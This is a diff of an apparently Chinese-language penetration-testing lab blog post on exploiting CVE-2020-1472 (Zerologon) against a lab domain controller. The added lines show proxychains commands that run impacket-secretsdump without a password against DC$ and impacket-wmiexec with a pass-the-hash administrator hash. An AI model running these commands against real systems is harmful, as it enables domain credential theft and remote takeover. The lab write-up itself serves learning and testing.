@@ -154,7 +154,7 @@ whoami
 <img src="https://V-alkoinen.github.io/post-images/1646134241846.png" alt="" loading="lazy"><br>
 <img src="https://V-alkoinen.github.io/post-images/1646134566286.png" alt="" loading="lazy"></p>
 <h1 id="试用下cve-2020-1472">试用下CVE-2020-1472</h1>
-<p> 可利用该漏洞将域控的计算机的机器账号密码置为控，此处指的是 dc$<br>
+<p> 可利用该漏洞将域控的计算机的机器账号密码置为空，此处指的是 dc$<br>
  <a href="https://github.com/dirkjanm/CVE-2020-1472">CVE-2020-1472</a><br>
  先搞个socks（之前已经添加过route了）</p>
 <pre><code>search socks
@@ -170,6 +170,12 @@ proxychains -q python3 1.py DC 10.10.10.10
 <p><img src="https://V-alkoinen.github.io/post-images/1646139693934.png" alt="" loading="lazy"><br>
 <img src="https://V-alkoinen.github.io/post-images/1646139699034.png" alt="" loading="lazy"><br>
 <img src="https://V-alkoinen.github.io/post-images/1646139703868.png" alt="" loading="lazy"></p>
+<pre><code>proxychains -q impacket-secretsdump de1ay.com/DC\$@10.10.10.10 -no-pass 
+proxychains -q impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:bed797322eabe7ceb21dc1a0534fe091 de1ay.com/administrator@10.10.10.10
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646309646321.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646309651604.png" alt="" loading="lazy"></p>
+<p>GET!!</p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
